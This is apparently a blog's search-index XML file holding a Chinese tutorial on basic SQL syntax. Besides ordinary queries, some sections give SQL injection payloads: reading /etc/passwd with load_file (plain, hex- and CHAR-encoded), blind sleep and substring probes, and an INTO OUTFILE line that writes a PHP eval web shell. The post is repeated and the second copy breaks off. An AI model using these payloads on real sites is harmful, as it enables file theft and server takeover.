<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>sql基础语法</title>
    <link href="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/"/>
    <url>/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/</url>
    
    <content type="html"><![CDATA[<h2 id="基础语句"><a href="#基础语句" class="headerlink" title="基础语句"></a>基础语句</h2><h3 id="select语句"><a href="#select语句" class="headerlink" title="select语句"></a>select语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users; # 读取users表的信息,<span class="hljs-operator">*</span>通配符<br><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users; # 查询指定字段的信息<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span>; # <span class="hljs-keyword">where</span>语句，指定查询位置<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">&lt;</span> <span class="hljs-number">4</span>; <br></code></pre></td></tr></table></figure><p>sql中有很多的比较符，如 &#x3D;，&gt; 、&lt; 、&#x3D;、&gt;&#x3D;、&lt;&#x3D; 、like、between、in 等</p><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228113036555.png" alt="image-20230228113036555"></p><h3 id="and-amp-or-对数据进行过滤"><a href="#and-amp-or-对数据进行过滤" class="headerlink" title="and &amp; or 对数据进行过滤"></a>and &amp; or 对数据进行过滤</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id<span class="hljs-operator">&lt;</span><span class="hljs-number">4</span> <span class="hljs-keyword">and</span> id <span class="hljs-operator">&gt;</span><span class="hljs-number">1</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> id <span class="hljs-operator">=</span><span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228113736000.png" alt="image-20230228113736000"></p><h3 id="order-by-排序"><a href="#order-by-排序" class="headerlink" title="order by 排序"></a>order by 排序</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> username; # 默认升序<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> username <span class="hljs-keyword">DESC</span>; # 降序<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228114106194.png" alt="image-20230228114106194"></p><h3 id="insert-into—向表中插入记录"><a href="#insert-into—向表中插入记录" class="headerlink" title="insert  into—向表中插入记录"></a>insert  into—向表中插入记录</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> student <span class="hljs-keyword">values</span>(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;eee&#x27;</span>,<span class="hljs-string">&#x27;fff&#x27;</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,password) <span class="hljs-keyword">values</span> (<span class="hljs-number">6</span>,&quot;eee&quot;,&quot;fff&quot;);<br></code></pre></td></tr></table></figure><h3 id="update更新表中的数据"><a href="#update更新表中的数据" class="headerlink" title="update更新表中的数据"></a>update更新表中的数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> student <span class="hljs-keyword">set</span> username<span class="hljs-operator">=</span>&quot;root&quot;,password<span class="hljs-operator">=</span>&quot;root1&quot; <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">6</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228115131492.png" alt="image-20230228115131492"></p><h3 id="alter-table-更新表"><a href="#alter-table-更新表" class="headerlink" title="alter table 更新表"></a>alter table 更新表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> <span class="hljs-operator">&lt;</span>列名<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span>;     <span class="hljs-operator">/</span><span class="hljs-operator">/</span>增加新列<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">drop</span> <span class="hljs-keyword">column</span> <span class="hljs-operator">&lt;</span>列名<span class="hljs-operator">&gt;</span>;               <span class="hljs-operator">/</span><span class="hljs-operator">/</span>删除列<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>旧表名<span class="hljs-operator">&gt;</span> rename <span class="hljs-keyword">to</span> <span class="hljs-operator">&lt;</span>新表名<span class="hljs-operator">&gt;</span>;   # 重命名表<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228154309683.png" alt="image-20230228154309683"></p><h3 id="like-在where子句中搜索列中的指定模式"><a href="#like-在where子句中搜索列中的指定模式" class="headerlink" title="like 在where子句中搜索列中的指定模式"></a>like 在where子句中搜索列中的指定模式</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> &quot;ad%&quot;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228115351727.png" alt="image-20230228115351727"></p><h3 id="union-合并两个或多个select语句的结果"><a href="#union-合并两个或多个select语句的结果" class="headerlink" title="union 合并两个或多个select语句的结果"></a>union 合并两个或多个select语句的结果</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> student <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> stu_id <span class="hljs-keyword">from</span> student;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228115707119.png" alt="image-20230228115707119"></p><h3 id="别名-as"><a href="#别名-as" class="headerlink" title="别名(as)"></a>别名(as)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span>列名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">as</span> <span class="hljs-operator">&lt;</span>别名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><h3 id="create-table创建表"><a href="#create-table创建表" class="headerlink" title="create table创建表"></a>create table创建表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span>(<br><span class="hljs-operator">&lt;</span>列名<span class="hljs-number">1</span><span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>约束条件<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">&lt;</span>列名<span class="hljs-number">2</span><span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>约束条件<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">&lt;</span>列名<span class="hljs-number">3</span><span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>数据类型<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>约束条件<span class="hljs-operator">&gt;</span><br>...<br>);<br></code></pre></td></tr></table></figure><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="user"><a href="#user" class="headerlink" title="user()"></a>user()</h3><ul><li>查看当前数据库用户</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228120102644.png" alt="image-20230228120102644"></p><h3 id="database"><a href="#database" class="headerlink" title="database()"></a>database()</h3><ul><li>查看当前数据库的名字</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228125958355.png" alt="image-20230228125958355"></p><h3 id="version"><a href="#version" class="headerlink" title="version()"></a>version()</h3><ul><li>查看当前数据库的版本信息</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228130050495.png" alt="image-20230228130050495"></p><h3 id="hostname"><a href="#hostname" class="headerlink" title="@@hostname"></a>@@hostname</h3><ul><li>查看当前计算机的用户名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@hostname</span>;<br></code></pre></td></tr></table></figure><h3 id="datadir"><a href="#datadir" class="headerlink" title="@@datadir"></a>@@datadir</h3><ul><li>查看mysql的data目录的绝对路径</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228130335710.png" alt="image-20230228130335710"></p><h3 id="version-compile-os"><a href="#version-compile-os" class="headerlink" title="@@version_compile_os"></a>@@version_compile_os</h3><ul><li>查看操作系统位数</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228130518306.png" alt="image-20230228130518306"></p><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><ul><li>读取文件</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>),<span class="hljs-number">3</span>#<br># 编码<br><span class="hljs-number">1</span><span class="hljs-operator">-</span>十六进制编码<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(<span class="hljs-number">0x2f6574632f706173737764</span>),<span class="hljs-number">3</span>#  <br><span class="hljs-number">0x2f6574632f706173737764</span><span class="hljs-comment">---&gt;/etc/passwd</span><br><span class="hljs-number">2</span><span class="hljs-operator">-</span><span class="hljs-type">CHAR</span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(<span class="hljs-type">CHAR</span>(<span class="hljs-number">47</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">47</span>,<span class="hljs-number">112</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">119</span>,<span class="hljs-number">100</span>)),<span class="hljs-number">3</span>#<br><br></code></pre></td></tr></table></figure><h3 id="like"><a href="#like" class="headerlink" title="like"></a>like</h3><ul><li>类似于等号，可以使用通配符</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a&#x27;</span>;  # 查询username是a的字段<br># 带有<span class="hljs-operator">%</span>通配符<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>  #  查询username中开头是a的字段<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%a%&#x27;</span>　# 查询username中含有a的字段<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%a&#x27;</span>  # 查询username中结尾是a的字段<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228131858089.png" alt="image-20230228131858089"></p><h3 id="regexp"><a href="#regexp" class="headerlink" title="regexp()"></a>regexp()</h3><ul><li>只要有就能匹配，like是等于才匹配</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username regexp(<span class="hljs-string">&#x27;ad&#x27;</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> username regexp <span class="hljs-string">&#x27;ad&#x27;</span>;<br><br></code></pre></td></tr></table></figure><h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h3><ul><li>sleep(x)—-暂停x秒后执行</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>);<br># 这样写前面查询结果为空<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228132539314.png" alt="image-20230228132539314"></p><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><ul><li>if(条件,1,0) 如果条件成立，那么返回1，反之返回0，这里的返回值是可以任意修改的，也可以写表达式</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> if (<span class="hljs-number">1</span><span class="hljs-operator">&gt;</span><span class="hljs-number">2</span>,sleep(<span class="hljs-number">5</span>),sleep(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h3 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h3><ul><li>mid(a,b,c) 从b位置开始，截取a字符串的c位</li><li>mid()字符串的下标是从1开始算的</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> stu_id <span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> mid(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228132919936.png" alt="image-20230228132919936"></p><h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><ul><li>substr(a,b,c) 从b位置开始，截取字符串a长度为c的字符串，这个与mid不同的是substr的b和c可以自动取整 substr从1开始计位数</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228133303859.png" alt="image-20230228133303859"></p><h3 id="left"><a href="#left" class="headerlink" title="left"></a>left</h3><ul><li>left(a,b) 从左侧截取a的前b位</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> stu_id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>(database(),<span class="hljs-number">2</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;st&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228133514200.png" alt="image-20230228133514200"></p><h3 id="length"><a href="#length" class="headerlink" title="length"></a>length</h3><ul><li>length()判断长度 比如说length(database())&#x3D;8 判断数据库名的长度是不是等于8</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> stu_id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">&gt;</span><span class="hljs-number">2</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228133712719.png" alt="image-20230228133712719"></p><h3 id="ord-ascii"><a href="#ord-ascii" class="headerlink" title="ord ascii"></a>ord ascii</h3><ul><li>ord()返回目标对应的ascii码值 ascii()与ord一致</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> ord(<span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> ascii(<span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228134029242.png" alt="image-20230228134029242"></p><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><ul><li>返回几列 比如limit(1,2)的意思就是从第一列开始返回2列 limit是从0开始计数的</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;students&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228134316450.png" alt="image-20230228134316450"></p><h3 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h3><ul><li>连接一个或多个字符串</li><li>concat_ws ：与concat基本一致，多了参数分隔符</li><li>group_concat()：连接每一个字符串默认以逗号分割的</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br><span class="hljs-keyword">select</span> concat(<span class="hljs-string">&#x27;stu&#x27;</span>,<span class="hljs-string">&#x27;dent&#x27;</span>);<br><span class="hljs-keyword">select</span> group_concat(database(),version());<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228151005441.png" alt="image-20230228151005441"></p><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228151225977.png" alt="image-20230228151225977"></p><h3 id="into-outfile写文件"><a href="#into-outfile写文件" class="headerlink" title="into outfile写文件"></a>into outfile写文件</h3><ul><li>magic_quotes_gpc&#x3D;OFF</li><li>用户有写权限</li><li>不能覆盖已经存在的文件</li><li>必须是最后一个查询语句</li><li>知道网站的绝对路径</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;c:\www\1.php &#x27;</span><br></code></pre></td></tr></table></figure><h3 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h3><ul><li>向下取整</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228151724767.png" alt="image-20230228151724767"></p><h3 id="extractValue"><a href="#extractValue" class="headerlink" title="extractValue"></a>extractValue</h3><ul><li>从目标xml中返回包含所查询的字符串</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(xml_document,xpath_string)<br>xml_document:string类型,为xml对象的名称<br>xpath_string:xpath格式的字符串<br></code></pre></td></tr></table></figure><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><ul><li>修改xml文档中的内容</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">updatexml(文件名，路径，数值)<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><ul><li>相当于自然对数的N次方</li><li>自然对数是以常数e为底数的对数，记作lnN（N&gt;0）。</li></ul><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1/image-20230228153522318.png" alt="image-20230228153522318"></p><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://alonglx.blog.csdn.net/article/details/124634092?spm=1001.2014.3001.5502">(91条消息) 一篇文章彻底学懂SQL注入(包含基础数据库句法、SQL注入原理以及所有常见SQL注入类型以及绕过手法)_为什么sql注入用字段_AlongLx的博客-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/57558184">SQL基础知识总结 - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>sql基础语法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql基础语法</title>
    <link href="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
    <url>/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="基础语句"><a href="#基础语句" class="headerlink" title="基础语句"></a>基础语句</h2><h3 id="select语句"><a href="#select语句" class="headerlink" title="select语句"></a>select语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users; # 读取users表的信息,<span class="hljs-operator">*</span>通配符<br><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users; # 查询指定字段的信息<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span>; # <span class="hljs-keyword">where</span>语句，指定查询位置<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">&lt;</span> <span class="hljs-number">4</span>; <br></code></pre></td></tr></table></figure><p>sql中有很多的比较符，如 &#x3D;，&gt; 、&lt; 、&#x3D;、&gt;&#x3D;、&lt;&#x3D; 、like、between、in 等</p><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228113036555.png" alt="image-20230228113036555"></p><h3 id="and-amp-or-对数据进行过滤"><a href="#and-amp-or-对数据进行过滤" class="headerlink" title="and &amp; or 对数据进行过滤"></a>and &amp; or 对数据进行过滤</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id<span class="hljs-operator">&lt;</span><span class="hljs-number">4</span> <span class="hljs-keyword">and</span> id <span class="hljs-operator">&gt;</span><span class="hljs-number">1</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> id <span class="hljs-operator">=</span><span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228113736000.png" alt="image-20230228113736000"></p><h3 id="order-by-排序"><a href="#order-by-排序" class="headerlink" title="order by 排序"></a>order by 排序</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> username; # 默认升序<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> username <span class="hljs-keyword">DESC</span>; # 降序<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sql%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20230228114106194.png" alt="image-20230228114106194"></p><h3 id="insert-into—向表中插入记录"><a href="#insert-into—向表中插入记录" class="headerlink" title="insert  into—向表中插入记录"></a>insert  into—向表中插入记录</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> student <span 